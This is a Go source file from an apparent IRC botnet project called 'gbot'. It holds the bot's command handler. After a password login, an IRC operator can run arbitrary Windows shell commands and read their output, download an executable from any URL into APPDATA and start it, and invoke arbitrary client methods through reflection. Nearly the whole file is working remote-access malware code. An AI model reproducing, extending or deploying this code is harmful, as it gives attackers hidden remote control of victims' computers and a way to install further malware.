package irc
import (
	"fmt"
	gconfig "gbot/config"
	ghelper "gbot/helper"
	"io"
	"net/http"
	"os"
	"os/exec"
	"reflect"
	"strings"

	irc "github.com/fluffle/goirc/client"
)

func invoke(any interface{}, name string, args ...interface{}) {

	inputs := make([]reflect.Value, len(args))

	for i := range args {
		inputs[i] = reflect.ValueOf(args[i])
	}
	reflect.ValueOf(any).MethodByName(name).Call(inputs)
}

// DownloadAndRun download file and execute
func DownloadAndRun(url string) {
	fileName := ghelper.RandStringBytes(5) + ".exe"
	fmt.Println("Downloading " + url + " to " + fileName)
	output, err := os.Create(os.Getenv("APPDATA") + "\\" + fileName)
	if err != nil {
		return
	}
	defer output.Close()
	response, err := http.Get(url)
	if err != nil {
		return
	}
	defer response.Body.Close()
	n, err := io.Copy(output, response.Body)
	if err != nil {
		return
	}
	fmt.Println(string(n) + " file downloaded.")
	fmt.Println(os.Getenv("APPDATA") + "\\" + fileName)
	fmt.Println("Attempting to start " + fileName)
	exec.Command("cmd", "/c", "start", os.Getenv("APPDATA")+"\\"+fileName).Start()
}

// RegisterCommands comment
func RegisterCommands(client *irc.Conn) {

	client.HandleFunc(irc.PRIVMSG, func(conn *irc.Conn, line *irc.Line) {

		command := strings.Fields(line.Text())[0]
		firstChar := string(strings.Fields(line.Text())[0][0])

		if command == "!login" {

			password := strings.Fields(line.Text())[1]
			source := line.Args[0]

			if gconfig.AdminPass == password {
				gconfig.Admins = append(gconfig.Admins, line.Src)
				conn.Privmsg(source, "Logged in")
			}
		}

		if ghelper.IsAdmin(line.Src) {

			if firstChar == gconfig.BuildItCommandOperator {

				command = strings.Title(strings.Replace(command, gconfig.BuildItCommandOperator, "", -1))
				sArgs := strings.Fields(line.Text())[1:]

				iArgs := make([]interface{}, len(sArgs))
				for i, v := range sArgs {
					iArgs[i] = v
				}

				invoke(client, command, iArgs...)
			}

			if command == "!logout" {

				source := line.Args[0]
				gconfig.Admins = ghelper.RemoveFromSlice(gconfig.Admins, line.Src)
				conn.Privmsg(source, "Logged out")
			}

			if command == "!cmd" {

				cmdCommand := strings.Join(strings.Fields(line.Text())[1:], " ")
				out, err := exec.Command("cmd", "/C", cmdCommand).Output()
				source := line.Args[0]

				if err != nil {
					conn.Privmsg(source, "an error occurred: "+err.Error())
					return
				}

				output := strings.Split(string(out[:]), "\n")

				for _, m := range output {
					conn.Privmsg(source, m)
				}

			}

			if command == "!download&run" {
				url := strings.Join(strings.Fields(line.Text())[1:], " ")
				DownloadAndRun(url)
			}

		}

	})

}
